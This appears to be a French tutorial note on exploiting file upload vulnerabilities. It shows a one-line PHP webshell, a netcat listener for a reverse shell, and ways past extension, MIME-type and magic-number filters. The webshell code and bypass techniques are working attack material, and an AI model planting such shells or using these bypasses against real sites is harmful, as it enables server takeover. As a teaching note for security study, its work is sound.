
Après avoir [analyser toutes les routes du sites](Decouvertes_du_contenu), on a maintenant une idée d'**où sont stocké les fichiers** que l'on upload.

## __Overwriting Files__

Si le fichier que nous uploadons sera situé au même endroit que les assets du site, nous pouvons écraser un ancien fichier.

![[overwriting1.png]]

On voit que le nom du fichier est *spaniel.jpg*, on peut donc renomer un fichier spaniel.jpg et celui-ci écrasera l'ancien fichier.

![[overwriting2.png]]


## __Remote Controle Execution__

Admettons que nous avons trouvé que nos images sont stocké dans le dossier *uploads/*, on peut se rendre dans ce dossier et nous verrons apparaitre notre image.

![[webshell1.png]]

### Webshell

On peut maintenant essayer d'upload un **executeur de commande**, pour ce faire nous allons créer un fichier PHP contenant ce code :

```php
<?php  
    echo system($_GET["cmd"]); // affiche le resultat de la commande passé en paramètre  
?>
```

Maintenant si nous nous rendons sur notre fichier, nous pouvons mettre notre commande dans l'url
**`webshell.php?cmd=id;whoami;ls`**

![[webshell2.png]]


### Reverse shell

Pour en savoir plus sur les reverse shells, rendez vous dans **[[Reverse_Shell]]**.

On peut donc upload notre reverse shell.

Ensuite il faut qu'on **démarre un serveur Netcat** :

```shell
user@ip:~$ rlwrap nc -vnlp 1234
```

Puis lorsque nous allons nous rendre là où est sauvegardé notre fichier, notre reverse shell aura démarré.


## __Filtering__

Il y a principalement 3 manière de filtrer les fichiers entrant.

### Extension validation

Un code de validation de l'extension pourrai ressembler à celà :

```javascript
let extension = fileName.split(".")[1]; // regarde la 2e partie du nom du fichier

if(extension != "jpg" && extension != "jpeg"){ // vérifie s'il n'est pas en .jpeg
	console.log("Mauvais format !");
	return; // ne donne pas suite à la requête
}
```

Pour bypass ce type de scénario, on doit tout simplement **changer l'extension** de notre fichier et mettant par exemple  **`shell.jpg.php`**.


On peut aussi avoir un autre type de filtrage ressemblant à celà :

```javascript
let decoupage = fileName.split("."); // decoupe le nom du fichier avec les .
let extension = decoupage[decoupage.length - 1]; // recupere la derniere partie du nom

if(extension == "php"){ // vérifie s'il est en .php
	console.log("Mauvais format !");
	return; // ne donne pas suite à la requête
}
```

Pour bypass ce type de scénario, on peut remplacer l'extension **`.php`** par d'[autres extensions](https://en.wikipedia.org/wiki/PHP) pouvant exécuter du PHP. Par exemple : *.phtml*, *.phar* ou encore *.php5*

### MIME Validation

Dans les requêtes HTTP, il y a un attribut qui qualifie le **type de fichier envoyé**, on l'appelle **MIME** (Multipurpose Internet Mail Extension).

Si l'on intercepte une requête avec [burpsuite](https://portswigger.net/burp/communitydownload) on obtiendra quelque chose comme ça :

![[MIME_validation.png]]

On peut voir la ligne **`Content-Type: image/jpeg`** qui veut dire que le document que nous essayons d'envoyer est une image en jpeg.

Pour notre shell, la ligne sera **`Content-Type: application/php`**, on doit donc la modifier pour qu'elle soit perçu comme une image.


### Magic Number

Les fichiers sont encodé en **ASCII** et chaque type de fichier a une **signature**, c'est une suite de caractère qui dit de quel catégorie ils font partie. On peut par exemple chercher dans une [liste de signature](https://en.wikipedia.org/wiki/List_of_file_signatures) quelle est la signature d'un fichier PNG.

Si on ouvre une image PNG avec [hexeditor](https://www.kali.org/tools/ncurses-hexedit/), on obtiendra un résultat similaire à ça :

![[Magic_Number1.png]]

On peut voir que la signature est les 8 premiers octets du fichier, ici `89 50 4E 47 0D 0A 1A 0A`.



